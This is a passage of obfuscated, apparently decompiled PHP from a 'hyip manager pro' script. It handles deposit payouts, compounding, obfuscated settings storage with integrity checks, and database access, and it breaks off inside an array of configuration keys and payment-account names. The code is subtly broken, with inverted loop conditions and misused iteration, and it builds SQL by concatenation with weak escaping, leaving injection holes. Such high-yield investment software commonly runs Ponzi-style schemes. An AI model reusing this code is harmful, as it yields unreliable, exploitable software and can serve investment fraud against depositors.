                                        $elnlczQGd = floor( ( floor( $elnlczQGd * 100000 ) / 100000 - floor( $elnlczpPvP * 100000 ) / 100000 ) * 100 ) / 100;
                                        $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                        amount = -{$elnlczpPvP},\r\n                    \t\ttype='deposit',\r\n                    \t\tdescription = 'Compounding deposit',\r\n                    \t\tactual_amount = -{$elnlczpPvP},\r\n                    \t\tec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    \t\tdate = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                                deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                        $q = "update hm2_deposits set amount = amount + {$elnlczpPvP},\r\n                    \t\tactual_amount = actual_amount + {$elnlczpPvP}\r\n                    \t\twhere id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                    }
                                }
                                elnlcyioda( $elnlcPSitf[$elnlcbhAzL['elnlcIGomq']], $elnlczQGd, "date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}" );
                            }
                        }
                        $q = "update hm2_deposits set \r\n      \tq_pays = q_pays + 1, \r\n      \tlast_pay_date = last_pay_date + interval {$elnlcWtdA} {$elnlcooIpx} where id =".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                } while ( 1 );
            }
            $q = "select * from hm2_types where q_days > 0";
            $elnlcRLPe = mysql_query( $q );
            do
            {
                if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                {
                    $elnlcgsDC = $elnlcPSitf[$elnlcbhAzL['elnlcQDdo']] + $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] - ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] ? 1 : 0 );
                    $elnlclrarK = $elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcUFbp']] == 1 )
                    {
                        $q = "select * from hm2_deposits where \r\n                type_id = {$elnlclrarK} and \r\n                status = 'on' and \r\n                user_id = {$elnlcBpRxC} and \r\n                (deposit_date + interval {$elnlcgsDC} day < last_pay_date or deposit_date + interval {$elnlcgsDC} day < now()) and\r\n                (({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} = 0) || ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} && (deposit_date + interval {$elnlcPSitf[$elnlcbhAzL['elnlcKryj']]} day < now())))\r\n             ";
                        $elnlcHAEbv = mysql_query( $q );
                        while ( $elnlcukjg = mysql_fetch_array( $elnlcHAEbv ) )
                        {
                            $q = "insert into hm2_history set\r\n                user_id = ".$elnlcukjg[$elnlcbhAzL['elnlcPqCb']].",\r\n      \t\tamount = ".$elnlcukjg[$elnlcbhAzL['elnlcowtbp']].",\r\n      \t\ttype='release_deposit',\r\n      \t\tactual_amount = ".$elnlcukjg[$elnlcbhAzL['elnlcowtbp']].",\r\n                      ec = ".$elnlcukjg[$elnlcbhAzL['elnlcLlqz']].",\r\n      \t\tdate = '".$elnlcukjg[$elnlcbhAzL['elnlcwtbS']]."' + interval {$elnlcgsDC} day,\r\n                      deposit_id = ".$elnlcukjg[$elnlcbhAzL['elnlcIGomq']];
                            if ( !mysql_query( $q ) )
                            {
                            }
                        }
                    }
                    $q = "update hm2_deposits set status='off' where \r\n             user_id = {$elnlcBpRxC} and \r\n    \t       (deposit_date + interval {$elnlcgsDC} day < last_pay_date or deposit_date + interval {$elnlcgsDC} day < now()) and\r\n             (({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} = 0) || ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} && (deposit_date + interval {$elnlcPSitf[$elnlcbhAzL['elnlcKryj']]} day < now()))) and\r\n             type_id = {$elnlclrarK}\r\n           ";
                    if ( !mysql_query( $q ) )
                    {
                    }
                }
            } while ( 1 );
        }
    }
}

function elnlcucuo( $a )
{
    global $elnlcbhAzL;
    if ( $a != "hyip manager pro 2005 jul 26" )
    {
        exit( );
    }
    if ( !file_exists( "settings.php" ) )
    {
        return array( );
    }
    $elnlcfaqvM = file( $elnlcbhAzL['elnlcqBwj'] );
    $t = chop( $elnlcfaqvM[1] );
    $elnlcrTjI = strlen( $t ) / 2;
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $t ); $i += 2 )
    {
        $d[$i / 2] = substr( $t, $i, 2 );
        $d[$i / 2] = chr( hexdec( $d[$i / 2] ) ^ 65 );
    }
    $k = "";
    $elnlctvrQ = elnlctiie( 0, $elnlcrTjI, $d );
    $j = $elnlcrTjI;
    while ( 10 < $j )
    {
        $elnlctvrQ = elnlctiie( $elnlctvrQ, $elnlcrTjI, $d );
        $k .= $d[$elnlctvrQ];
        $d[$elnlctvrQ] = -1;
        --$j;
    }
    $z = chr( 1 ).chr( 1 ).chr( 1 );
    list( $k, $z ) = split( "{$z}", $k, 2 );
    list( $elnlcSIPm, $elnlcKsaSj, $k ) = split( ":", $k, 3 );
    if ( $elnlcSIPm != md5( $k ) )
    {
        print "Settings are broken. Contact developers please";
        exit( );
    }
    if ( $elnlcKsaSj = !md5( $elnlcSIPm.$elnlcKIydR ) )
    {
        print "Settings are broken. Contact developers please";
        exit( );
    }
    $z = unserialize( $k );
    $z[time_dif] = sprintf( "%d", $z[$elnlcbhAzL['elnlcDtCI']] );
    $elnlcGqOxC = array( "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", $elnlcbhAzL['elnlcaAWt'] );
    $z[$elnlcbhAzL['elnlczcEc']] = $elnlcGqOxC[$z[$elnlcbhAzL['elnlcfUqW']] - 1];
    if ( $z[$elnlcbhAzL['elnlcaJLE']] == 1 )
    {
        $z[$elnlcbhAzL['elnlcxBtR']] = sprintf( "%d", ( time( ) - mktime( 0, 0, 0, $z[$elnlcbhAzL['elnlcfUqW']], $z[$elnlcbhAzL['elnlcFGghW']], $z[$elnlcbhAzL['elnlctzFV']] ) ) / 86400 );
    }
    $z[$elnlcbhAzL['elnlcwnIm']] = $z[$elnlcbhAzL['elnlcVuhL']] ? 1 : 0;
    $z[$elnlcbhAzL['elnlcTrKHL']] = $z[$elnlcbhAzL['elnlcRiER']];
    return $z;
}

function elnlcnvaa( )
{
    global $elnlcbhAzL;
    $elnlcmRQde = $elnlcbhAzL['elnlcSFKV'];
    if ( file_exists( "./tmpl_c/.htdata" ) )
    {
        $elnlcmRQde = $elnlcbhAzL['elnlcRlJry'];
    }
    $s = array( );
    $elnlcfaqvM = fopen( $elnlcbhAzL['elnlcqabv'], $elnlcbhAzL['elnlcJwwoe'] );
    while ( !$elnlcfaqvM || !( $elnlcQGVA = fgets( $elnlcfaqvM, 20000 ) ) )
    {
        $elnlcQGVA = chop( $elnlcQGVA );
        if ( $elnlcQGVA != "<?/*" && $elnlcQGVA != "*/?>" )
        {
            $elnlcIDtPH = $elnlcwocfW = "";
            list( $elnlcIDtPH, $elnlcwocfW ) = split( "\t", @$elnlcQGVA, 2 );
            if ( preg_match( "/^key|^cnf/", $elnlcIDtPH ) && $elnlcmRQde == 1 || $elnlcmRQde == 0 )
            {
                $s[$elnlcIDtPH] = $elnlcwocfW;
            }
        }
    }
    fclose( $elnlcfaqvM );
    if ( $elnlcmRQde == 1 )
    {
        $elnlcPwdn = file( $elnlcbhAzL['elnlcsisuI'] )[1];
        $elnlcQGVA = file( $elnlcbhAzL['elnlcsisuI'] )[0];
        $elnlcBnLdE = $elnlcQGVA;
        $elnlcHSeBC = $elnlcbhAzL['elnlcSFKV'];
        $i = $elnlcbhAzL['elnlcSFKV'];
        for ( ; $i < strlen( $elnlcBnLdE ); $i += 5 )
        {
            $elnlcHSeBC += hexdec( substr( $elnlcBnLdE, $i, 5 ) );
        }
        if ( $s[$elnlcbhAzL['elnlcaDLfe']] != $elnlcHSeBC * 15 )
        {
            print "<!-- Settings are broken. Please e-mail to script developers as soon as possible -->";
            print "System maintenance and hardware upgrades.";
            exit( );
        }
        $elnlcQGVA = elnlcbeub( $elnlcQGVA, $s[$elnlcbhAzL['elnlckWIL']] );
        $elnlcFptjc = split( "\n", $elnlcQGVA );
        $i = $elnlcbhAzL['elnlcSFKV'];
        for ( ; $i < sizeof( $elnlcFptjc ); ++$i )
        {
            $elnlcwocfW = split( "\t", $elnlcFptjc[$i], 2 )[1];
            $elnlcIDtPH = split( "\t", $elnlcFptjc[$i], 2 )[0];
            $s[$elnlcIDtPH] = $elnlcwocfW;
        }
    }
    $elnlcGqOxC = array( "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", $elnlcbhAzL['elnlcaAWt'] );
    $s[$elnlcbhAzL['elnlczcEc']] = $elnlcGqOxC[$s[$elnlcbhAzL['elnlcfUqW']] - 1];
    if ( $s[$elnlcbhAzL['elnlcaJLE']] == 1 )
    {
        $s[$elnlcbhAzL['elnlcxBtR']] = sprintf( "%d", ( time( ) - mktime( 0, 0, 0, $s[$elnlcbhAzL['elnlcfUqW']], $s[$elnlcbhAzL['elnlcFGghW']], $s[$elnlcbhAzL['elnlctzFV']] ) ) / 86400 );
    }
    $s[$elnlcbhAzL['elnlcDtCI']] = sprintf( "%d", $s[$elnlcbhAzL['elnlcDtCI']] );
    $s[$elnlcbhAzL['elnlcwnIm']] = $s[$elnlcbhAzL['elnlcVuhL']] ? 1 : 0;
    $s[$elnlcbhAzL['elnlcTrKHL']] = $s[$elnlcbhAzL['elnlcRiER']];
    return $s;
}

function elnlcbedt( $a )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( $a != "hyip manager pro 2005 jul 26" )
    {
        exit( );
    }
    $elnlcKIydR = serialize( $elnlctVnzQ );
    $elnlcSIPm = md5( $elnlcKIydR );
    $elnlcKsaSj = md5( $elnlcSIPm.$elnlcKIydR );
    $elnlcKIydR = $elnlcSIPm.":".$elnlcKsaSj.":".$elnlcKIydR;
    $elnlcKIydR .= chr( 1 ).chr( 1 ).chr( 1 );
    $elnlcrTjI = strlen( $elnlcKIydR ) + 121;
    $elnlctvrQ = rand( 1, 1e+011 ) % $elnlcrTjI;
    $elnlcedOD = array( );
    $d = array( );
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < $elnlcrTjI; ++$i )
    {
        $d[$i] = -1;
        $elnlcedOD[$i] = -1;
    }
    $elnlctvrQ = elnlcvlns( 0, $elnlcrTjI, $d );
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $elnlcKIydR ); ++$i )
    {
        $elnlctvrQ = elnlcvlns( $elnlctvrQ, $elnlcrTjI, $d );
        $d[$elnlctvrQ] = substr( $elnlcKIydR, $i, 1 );
    }
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < $elnlcrTjI; ++$i )
    {
        if ( $d[$i] == -1 )
        {
            $d[$i] = chr( rand( 1, 253 ) );
        }
    }
    $elnlcfaqvM = fopen( $elnlcbhAzL['elnlcAjJs'], $elnlcbhAzL['elnlcQLIgw'] );
    $r = array( );
    fputs( $elnlcfaqvM, "<?\n" );
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < $elnlcrTjI; ++$i )
    {
        fputs( $elnlcfaqvM, sprintf( "%02x", ord( $d[$i] ) ^ 65 ) );
    }
    fputs( $elnlcfaqvM, "\n?>" );
    fclose( $elnlcfaqvM );
}

function elnlcnehee( )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    if ( !is_writeable( "settings.php" ) )
    {
        print "<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>settings.php</b> file!<br>";
        exit( );
    }
    if ( file_exists( "tmpl_c/.htdata" ) && !is_writeable( "tmpl_c/.htdata" ) )
    {
        print "<br><br><br><br><center><h1>Your settings has not been saved.<br>Please set 666 permissions for <b>tmpl_c/.htdata</b> file!<br>";
        exit( );
    }
    $elnlcmRQde = $elnlcbhAzL['elnlcSFKV'];
    if ( file_exists( "tmpl_c/.htdata" ) )
    {
        $elnlcmRQde = $elnlcbhAzL['elnlcRlJry'];
    }
    $elnlcfaqvM = fopen( $elnlcbhAzL['elnlcqabv'], $elnlcbhAzL['elnlcQLIgw'] );
    reset( $elnlctVnzQ );
    fputs( $elnlcfaqvM, "<?/*\n" );
    $elnlcBnLdE = "";
    $elnlcwocfW = each( $elnlctVnzQ )[1];
    $elnlcIDtPH = each( $elnlctVnzQ )[0];
    while ( each( $elnlctVnzQ ) )
    {
        if ( $elnlcIDtPH != "logged" )
        {
            if ( ( $elnlcmRQde == 0 || $elnlcmRQde == 1 && preg_match( "/^key/", $elnlcIDtPH ) ) && !preg_match( "/_generated/", $elnlcIDtPH ) )
            {
                fputs( $elnlcfaqvM, "{$elnlcIDtPH}\t{$elnlcwocfW}\n" );
                $elnlcBnLdE .= "{$elnlcIDtPH}\t{$elnlcwocfW}\n";
            }
            $elnlcBnLdE .= "{$elnlcIDtPH}\t{$elnlcwocfW}\n";
        }
    }
    $elnlcBnLdE = elnlcqnsm( $elnlcBnLdE, $elnlctVnzQ[$elnlcbhAzL['elnlckWIL']] );
    $elnlcHSeBC = $elnlcbhAzL['elnlcSFKV'];
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $elnlcBnLdE ); $i += 5 )
    {
        $elnlcHSeBC += hexdec( substr( $elnlcBnLdE, $i, 5 ) );
    }
    $elnlcHSeBC = $elnlcHSeBC * 15;
    fputs( $elnlcfaqvM, "cnf\t{$elnlcHSeBC}\n" );
    fputs( $elnlcfaqvM, "*/?>\n" );
    fclose( $elnlcfaqvM );
    if ( $elnlcmRQde == 1 )
    {
        $elnlcfaqvM = fopen( $elnlcbhAzL['elnlcWVJQ'], $elnlcbhAzL['elnlcQLIgw'] );
        fputs( $elnlcfaqvM, $elnlcBnLdE );
        fclose( $elnlcfaqvM );
    }
}

function elnlcrcux( $q, $w, $a )
{
    global $elnlcbhAzL;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcqnsm( $q, $w );
    }
    $l = strtoupper( md5( $w ) );
    $j = $elnlcbhAzL['elnlcSFKV'];
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $q ); ++$i )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $c .= sprintf( "%02x", ord( substr( $q, $i, 1 ) ) ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcbtyjc( $q, $w, $a )
{
    global $elnlcbhAzL;
    if ( $a != "hyip manager pro 2005 jul 27" )
    {
        return elnlcbeub( $q, $w );
    }
    $l = strtoupper( md5( $w ) );
    $j = $elnlcbhAzL['elnlcSFKV'];
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $q ); $i += 2 )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $a = hexdec( substr( $q, $i, 2 ) );
        $c .= chr( $a ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcqnsm( $q, $w )
{
    global $elnlcbhAzL;
    $l = strtoupper( md5( $w ) );
    $j = $elnlcbhAzL['elnlcSFKV'];
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $q ); ++$i )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $c .= sprintf( "%02x", ord( substr( $q, $i, 1 ) ) ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcbeub( $q, $w )
{
    global $elnlcbhAzL;
    $l = strtoupper( md5( $w ) );
    $j = $elnlcbhAzL['elnlcSFKV'];
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < strlen( $q ); $i += 2 )
    {
        if ( strlen( $l ) == $j + 10 )
        {
            $j = 0;
        }
        $a = hexdec( substr( $q, $i, 2 ) );
        $c .= chr( $a ^ ord( substr( $l, $j, 1 ) ) );
        ++$j;
    }
    return $c;
}

function elnlcfakbf( )
{
    global $elnlcbhAzL;
    if ( !( $elnlcGwcKy = mysql_connect( $elnlctVnzQ[$elnlcbhAzL['elnlcatLiN']], $elnlctVnzQ[$elnlcbhAzL['elnlcLRgb']], $elnlctVnzQ[$elnlcbhAzL['elnlcjMfxQ']] ) ) )
    {
        exit( mysql_error( ) );
    }
    if ( !mysql_select_db( $elnlctVnzQ[$elnlcbhAzL['elnlcuAKOV']] ) )
    {
        print mysql_error( );
        exit( );
    }
    return $elnlcGwcKy;
}

function elnlcusja( $elnlccyCM = 0 )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    $l = elnlcbtyjc( $elnlctVnzQ[$elnlcbhAzL['elnlcLRgb']], $elnlctVnzQ[$elnlcbhAzL['elnlckWIL']], $elnlcbhAzL['elnlcBJyh'] );
    $p = elnlcbtyjc( $elnlctVnzQ[$elnlcbhAzL['elnlcjMfxQ']], $elnlctVnzQ[$elnlcbhAzL['elnlckWIL']], $elnlcbhAzL['elnlcBJyh'] );
    $elnlcHIMW = elnlcbtyjc( $elnlctVnzQ[$elnlcbhAzL['elnlcuAKOV']], $elnlctVnzQ[$elnlcbhAzL['elnlckWIL']], $elnlcbhAzL['elnlcBJyh'] );
    if ( $elnlccyCM == 1 )
    {
        $elnlcGwcKy = @mysql_connect( @$elnlctVnzQ[$elnlcbhAzL['elnlcatLiN']], @$l, @$p );
        if ( $elnlcGwcKy && !mysql_select_db( $elnlcHIMW ) )
        {
            $elnlcGwcKy = $elnlcbhAzL['elnlcSFKV'];
            if ( !( $elnlcGwcKy = mysql_connect( $elnlctVnzQ[$elnlcbhAzL['elnlcatLiN']], $l, $p ) ) )
            {
                exit( mysql_error( ) );
            }
        }
    }
    else if ( !mysql_select_db( $elnlcHIMW ) )
    {
        print mysql_error( );
        exit( );
    }
    return $elnlcGwcKy;
}

function elnlcshepw( $elnlcGwcKy )
{
    global $elnlcbhAzL;
    mysql_close( $elnlcGwcKy );
}

function zelnlcdjxb( $elnlcUGiiE )
{
    global $elnlcbhAzL;
    $elnlcUGiiE = htmlspecialchars( $elnlcUGiiE, ENT_QUOTES );
    $elnlcUGiiE = str_replace( "\\", "\\\\", $elnlcUGiiE );
    $elnlcUGiiE = str_replace( "'", "\\'", $elnlcUGiiE );
    return $elnlcUGiiE;
}

function elnlcdjxb( $elnlcUGiiE )
{
    $elnlcUGiiE = str_replace( "'", "''", $elnlcUGiiE );
    $elnlcUGiiE = str_replace( "\\", "\\\\", $elnlcUGiiE );
    return $elnlcUGiiE;
}

function elnlcwnvax( $elnlcJdVQH, $elnlcasVe = 1 )
{
    global $elnlcbhAzL;
    $a = array( "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", $elnlcbhAzL['elnlcuUcWW'] );
    if ( $elnlcasVe == 2 )
    {
        $a = array( "1", "2", "3", "4", "5", "6", "7", "8", "9", $elnlcbhAzL['elnlcJnhgA'] );
    }
    $i = $elnlcbhAzL['elnlcSFKV'];
    $elnlcUGiiE = "";
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < $elnlcJdVQH; ++$i )
    {
        $elnlcUGiiE .= $a[rand( 0, sizeof( $a ) - 1 )];
    }
    if ( $elnlcasVe == 1 )
    {
        $elnlcUGiiE = md5( $elnlcUGiiE );
    }
    return $elnlcUGiiE;
}

function elnlcfiaan( $elnlcJdVQH )
{
    global $elnlcbhAzL;
    $a = array( "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "A", "B", "C", "D", "E", "F" );
    $i = $elnlcbhAzL['elnlcSFKV'];
    $elnlcUGiiE = "";
    $i = $elnlcbhAzL['elnlcSFKV'];
    for ( ; $i < $elnlcJdVQH; ++$i )
    {
        $elnlcUGiiE .= $a[rand( 0, sizeof( $a ) - 1 )];
    }
    return $elnlcUGiiE;
}

function elnlcrvkc( $elnlclrarK )
{
    global $elnlcbhAzL;
    $q = "select type, sum(actual_amount) as sum from hm2_history where user_id = {$elnlclrarK} group by type";
    if ( !( $elnlcRLPe = mysql_query( $q ) ) )
    {
    }
    $elnlcyKol = array( );
    while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
    {
        $elnlcyKol[$elnlcPSitf[$elnlcbhAzL['elnlcPzTr']]] = $elnlcPSitf[$elnlcbhAzL['elnlclRHJ']];
    }
    $elnlcNUJg = $elnlcbhAzL['elnlcSFKV'];
    $elnlcwocfW = each( $elnlcyKol )[1];
    $elnlcIDtPH = each( $elnlcyKol )[0];
    while ( each( $elnlcyKol ) )
    {
        $elnlcNUJg += $elnlcwocfW;
    }
    $elnlcyKol[$elnlcbhAzL['elnlcuUfGx']] = $elnlcNUJg;
    $q = "select sum(actual_amount) as sum from hm2_deposits where user_id = {$elnlclrarK} and status='on'";
    if ( !( $elnlcRLPe = mysql_query( $q ) ) )
    {
    }
    while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
    {
        $elnlcyKol[$elnlcbhAzL['elnlcoEopC']] += $elnlcPSitf[$elnlcbhAzL['elnlclRHJ']];
    }
    return $elnlcyKol;
}

function elnlccbixs( $elnlcJNNF, $elnlchyWE = false )
{
    global $elnlcbhAzL;
    $elnlcDheBD = "";
    if ( is_string( $elnlcJNNF ) && $elnlcJNNF !== "" )
    {
        $elnlcuWxWQ = intval( $elnlcJNNF );
        if ( strval( $elnlcuWxWQ ) === $elnlcJNNF )
        {
            $elnlcJNNF = $elnlcuWxWQ;
        }
        else
        {
            $elnlcaBin = floatval( $elnlcJNNF );
            if ( strval( $elnlcaBin ) === $elnlcJNNF )
            {
                $elnlcJNNF = $elnlcaBin;
            }
        }
    }
    if ( is_array( $elnlcJNNF ) )
    {
        reset( $elnlcJNNF );
        $elnlcNExx = true;
        $i = $elnlcbhAzL['elnlcSFKV'];
        foreach ( $elnlcJNNF as $elnlchcOIm => $elnlcgCCG )
        {
            if ( !is_int( $elnlchcOIm ) || $elnlchcOIm != $i )
            {
                $elnlcNExx = false;
                break;
            }
            ++$i;
        }
        $elnlcdyMH = $elnlcNExx ? "[" : "{";
        $elnlcDheBD .= $elnlcdyMH;
        $elnlcyPIGb = true;
        reset( $elnlcJNNF );
        foreach ( $elnlcJNNF as $elnlchcOIm => $elnlcgCCG )
        {
            if ( !$elnlcyPIGb )
            {
                $elnlcDheBD .= ",";
            }
            if ( !$elnlcNExx )
            {
                $elnlcDheBD .= $elnlchcOIm.":";
            }
            $elnlcDheBD .= elnlccbixs( $elnlcgCCG, $elnlchyWE );
            $elnlcyPIGb = false;
        }
        $elnlcdyMH = $elnlcNExx ? "]" : "}";
        $elnlcDheBD .= $elnlcdyMH;
    }
    else if ( is_string( $elnlcJNNF ) )
    {
        $elnlceuHfz = array( "\\", "'", "\n", "\r" );
        $elnlcMvpRO = array( "\\\\", "\\'", "\\n", "\\r" );
        if ( $elnlchyWE )
        {
            $elnlceuHfz[] = "<";
            $elnlcMvpRO[] = "<'+'";
        }
        $elnlcPwdn = str_replace( $elnlceuHfz, $elnlcMvpRO, $elnlcJNNF );
        $elnlcdyMH = "'".$elnlcPwdn."'";
        $elnlcDheBD .= $elnlcdyMH;
    }
    else if ( is_bool( $elnlcJNNF ) )
    {
        $elnlcdyMH = $elnlcJNNF ? "true" : $elnlcbhAzL['elnlcVTVk'];
        $elnlcDheBD .= $elnlcdyMH;
    }
    else if ( is_null( $elnlcJNNF ) )
    {
        $elnlcdyMH = "null";
        $elnlcDheBD .= $elnlcdyMH;
    }
    else
    {
        $elnlcdyMH = $elnlcJNNF;
        $elnlcDheBD .= $elnlcdyMH;
    }
    return $elnlcDheBD;
}

function elnlcwpfr( $elnlcdpvw )
{
    global $elnlcbhAzL;
    $elnlcDheBD = "";
    foreach ( $elnlcdpvw as $elnlchcOIm => $elnlcKQtm )
    {
        if ( $elnlcDheBD !== "" )
        {
            $elnlcDheBD .= ", ";
        }
        if ( substr( $elnlcKQtm, 0, 5 ) == "now()" )
        {
            $elnlcDheBD .= "{$elnlchcOIm} = {$elnlcKQtm}";
        }
        else
        {
            $elnlcDheBD .= "{$elnlchcOIm} = '".elnlcdjxb( $elnlcKQtm )."'";
        }
    }
    if ( $elnlcDheBD != "" )
    {
        $elnlcDheBD = " ".$elnlcDheBD." ";
    }
    return $elnlcDheBD;
}

function elnlcjbov( $elnlcwocfW )
{
    global $elnlcbhAzL;
    if ( $elnlcfGRe == ini_get( "magic_quotes_gpc" ) )
    {
        $elnlcwocfW = str_replace( "\\'", "'", $elnlcwocfW );
        $elnlcwocfW = str_replace( "\\\"", "\"", $elnlcwocfW );
        $elnlcwocfW = str_replace( "\\\\", "\\", $elnlcwocfW );
    }
    $elnlcwocfW = strip_tags( $elnlcwocfW );
    $elnlcwocfW = trim( $elnlcwocfW );
    return $elnlcwocfW;
}

function elnlcsjrut( $i, $j )
{
    return sprintf( "%.6f", $i );
}

function elnlcgawp( &$elnlcozkr, $elnlcuUCdu = 0 )
{
    global $elnlcbhAzL;
    reset( $elnlcozkr );
    foreach ( $elnlcozkr as $k => $v )
    {
        $elnlcHkxu = array( );
        if ( is_array( $v ) )
        {
            elnlcgawp( $elnlcozkr[$k], $elnlcuUCdu );
        }
        else
        {
            $elnlcHkxu = elnlcfkwtg( $v );
            $elnlcozkr[$k] = $elnlcHkxu[$elnlcuUCdu];
        }
    }
}

function elnlcfkwtg( $elnlcwocfW )
{
    global $elnlcbhAzL;
    global $elnlcWGBKV;
    if ( $elnlcWGBKV == 1 )
    {
        $elnlcwocfW = str_replace( "\\'", "'", $elnlcwocfW );
        $elnlcwocfW = str_replace( "\\\"", "\"", $elnlcwocfW );
        $elnlcwocfW = str_replace( "\\\\", "\\", $elnlcwocfW );
    }
    $elnlcrVHV = $elnlcwocfW;
    $elnlcwocfW = strip_tags( $elnlcwocfW );
    $elnlcwocfW = trim( $elnlcwocfW );
    return array( $elnlcwocfW, $elnlcrVHV );
}

$elnlcbhAzL = array( "elnlciNTI" => "daily_referral_percent", "elnlcKryj" => "withdraw_principal_duration", "elnlcWVJQ" => "./tmpl_c/.htdata", "elnlcbpUa" => "use_crontab", "elnlcvKOrI" => "85", "elnlcGavBh" => "12", "elnlcFGghW" => "site_start_day", "elnlcQDdo" => "q_days", "elnlcfVHWz" => "compound_min_deposit", "elnlcPzTr" => "type", "elnlcifhc" => "a", "elnlcjMfxQ" => "db_pass", "elnlcCswz" => "send_percent_to_stocks", "elnlceaRU" => "perfectmoney_from_account", "elnlclCDs" => "REMOTE_ADDR", "elnlcfbihT" => "work_week", "elnlcaJQt" => "max_amount", "elnlcDtCI" => "time_dif", "elnlcTxqa" => "site_name", "elnlcGblxn" => "plans_closed", "elnlcJwGmT" => "fee", "elnlclpBOq" => "intgold_from_account", "elnlcfibk" => "demomode", "elnlclkwD" => "dw", "elnlczoWB" => "site_url", "elnlcPeWJ" => "name", "elnlctoLR" => "y", "elnlcCJKK" => "altergold_from_account", "elnlcVTVk" => "false", "elnlcdvIfH" => "error", "elnlcxHmeU" => "SG8JH9DVX8952VQEZH9F", "elnlcltlK" => "/get_sha256.php", "elnlcRcNSM" => "HTTP_X_REAL_IP", "elnlcHFgU" => "18", "elnlcgdlS" => "HTTP_HOST", "elnlcMLNqH" => "UYKD37X8YLS5DNFFHL8R", "elnlcQLIgw" => "w", "elnlcxFqC" => "parent", "elnlcPqCb" => "user_id", "elnlcmjsrD" => "plan", "elnlcuolIp" => "stop_withdraw_percent", "elnlclRHJ" => "sum", "elnlcsiEn" => "html", "elnlcDSgst" => "last_pay_date", "elnlcJcSL" => "9999", "elnlcqBwj" => "settings.php", "elnlcmCml" => "checksum", "elnlcxkBA" => "EUR", "elnlcVBAI" => "HX8DJ7B9SH5JQN5FXK45", "elnlcWzLe" => "ref1_cms_minamount", "elnlcfUqW" => "site_start_month", "elnlcIcJT" => "ITEM_NUMBER", "elnlcLFPv" => "exchange", "elnlcQysB" => "__debug_out", "elnlcmQtKS" => "LREUR", "elnlcMmqF" => "return_profit_percent", "elnlcgzReJ" => "use_ip_for_auto", "elnlcQDgk" => "VPKLNMKMRG27HN95BEHP", "elnlcvePb" => "use_html", "elnlcatLiN" => "hostname", "elnlcFIMb" => "Success", "elnlcDQQP" => "evowallet_from_account", "elnlcppGwn" => "code", "elnlcqsrR" => "liberty_currency", "elnlclrlET" => "username", "elnlccVEB" => "2", "elnlccDio" => "batch", "elnlcpJTxg" => "AMOUNT", "elnlcmfrr" => "SCRIPT_NAME", "elnlcqvyE" => "min", "elnlcVntbh" => "N55HSU8NJSEU32DP8JDV", "elnlcJwWF" => "ref_username", "elnlcQeSi" => "withdraw_principal", "elnlczKwM" => "send_profit_to_stocks", "elnlczFIa" => "col", "elnlcDhfLC" => "egold_paymentunits", "elnlckTJV" => "eeecurrency_from_account", "elnlcuUcWW" => "z", "elnlcKfiHR" => "account", "elnlcDfLfq" => "enable_eb_gold", "elnlcoEopC" => "active_deposit", "elnlcxTfsm" => "accounts", "elnlctxqf" => "AKKD47LYX8H96K2TM2FQ", "elnlcKMbdy" => "value", "elnlcUavWu" => "evocash_from_account", "elnlchHBj" => "min_deposit", "elnlcscIHA" => "compound_max_percent", "elnlcipPS" => "end", "elnlcwEnB" => "unit", "elnlcxzUP" => "egold_from_account", "elnlcPFKc" => "admin_auto_pay_earning", 